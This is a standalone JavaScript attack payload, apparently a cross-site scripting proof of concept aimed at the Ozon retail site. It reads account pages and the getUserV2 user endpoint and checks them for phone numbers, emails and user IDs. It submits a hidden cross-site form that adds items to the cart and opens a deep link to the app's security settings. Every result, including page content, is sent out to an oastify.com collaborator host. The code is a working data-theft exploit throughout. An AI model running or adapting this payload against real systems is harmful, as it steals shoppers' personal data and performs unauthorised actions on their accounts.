alert('new_1');

var A = 'https://525hz9zc5mth4kmd2lkt04psdjja77vw.oastify.com';
var b = function(url, body) { navigator.sendBeacon(url, body || ''); };

b(A + '?s7_loaded');
b(A + '?ctx_body=' + (document.body ? 'exists' : 'NULL'));
b(A + '?ctx_title=' + encodeURIComponent(document.title || 'empty'));
b(A + '?ctx_url=' + encodeURIComponent(document.URL || 'empty'));
b(A + '?ctx_origin=' + encodeURIComponent(location.origin || 'empty'));

var cacheTargets = [
    'https://www.ozon.ru/mini-app-manifest',
    'https://www.ozon.ru/my/main',
    'https://www.ozon.ru/my/account',
    'https://www.ozon.ru/'
];
cacheTargets.forEach(function(url, i) {
    fetch(url, {method: 'GET', credentials: 'omit'})
    .then(function(r) {
        b(A + '?v1_c' + i + '_st=' + r.status);
        return r.text();
    })
    .then(function(t) {
        if (!t || t.length === 0) { b(A + '?v1_c' + i + '_empty'); return; }
        var hasPii = /userId|user_id|firstName|phone|email|clientId|orderCount/.test(t);
        b(A + '?v1_c' + i + '_pii=' + hasPii + '&len=' + t.length);
        b(A + '/v1_c' + i, t.substring(0, 3000));
    })
    .catch(function(e) {
        b(A + '?v1_c' + i + '_err', e.message.substring(0, 80));
    });
});

(function() {
    try {
        var iframe = document.createElement('iframe');
        iframe.name = 'csrf_target';
        iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px';
        document.body.appendChild(iframe);

        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart';
        form.enctype = 'text/plain';
        form.target = 'csrf_target';

        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = '[{"id":1215057882,"quantity":1,"_';
        input.value = '":"1"}]';
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();

        b(A + '?v2_form_submitted');

        setTimeout(function() {
            try {
                var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                var iframeContent = iframeDoc ? (iframeDoc.body ? iframeDoc.body.innerText : 'no_body') : 'no_doc';
                b(A + '?v2_iframe_response', iframeContent.substring(0, 500));
            } catch(e) {
                b(A + '?v2_iframe_err', e.message.substring(0, 80));
            }
        }, 3000);
    } catch(e) {
        b(A + '?v2_form_err', e.message.substring(0, 80));
    }
})();

(function() {
    try {
        var iframe2 = document.createElement('iframe');
        iframe2.name = 'user_target';
        iframe2.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px';
        document.body.appendChild(iframe2);

        var form2 = document.createElement('form');
        form2.method = 'POST';
        form2.action = 'https://www.ozon.ru/api/composer-api.bx/_action/getUserV2';
        form2.enctype = 'text/plain';
        form2.target = 'user_target';

        var input2 = document.createElement('input');
        input2.name = '{';
        input2.value = '}';
        form2.appendChild(input2);
        document.body.appendChild(form2);
        form2.submit();

        setTimeout(function() {
            try {
                var d = iframe2.contentDocument || iframe2.contentWindow.document;
                var txt = d && d.body ? d.body.innerText : 'inaccessible';
                b(A + '?v3_user_iframe', txt.substring(0, 1000));
            } catch(e) {
                b(A + '?v3_user_xorigin', e.message.substring(0, 60));
            }
        }, 3000);
    } catch(e) {
        b(A + '?v3_user_err', e.message.substring(0, 80));
    }
})();

b(A + '?v4_deeplink_send');
try {
    window.location = 'ozon://my/settings/security';
    b(A + '?v4_deeplink_ok');
} catch(e) {
    b(A + '?v4_deeplink_err', e.message.substring(0, 60));
}

try {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://www.ozon.ru/api/composer-api.bx/_action/getUserV2', true);
    xhr.withCredentials = true;
    xhr.setRequestHeader('Content-Type', 'text/plain');
    xhr.onreadystatechange = function() {
        if (xhr.readyState !== 4) return;
        b(A + '?v5_xhr_st=' + xhr.status + '&len=' + (xhr.responseText || '').length);
        if (xhr.status === 200 && xhr.responseText) {
            b(A + '/v5_xhr_data', xhr.responseText.substring(0, 3000));
        }
    };
    xhr.onerror = function() { b(A + '?v5_xhr_net_err'); };
    xhr.send('{}');
} catch(e) {
    b(A + '?v5_xhr_ex', e.message.substring(0, 60));
}
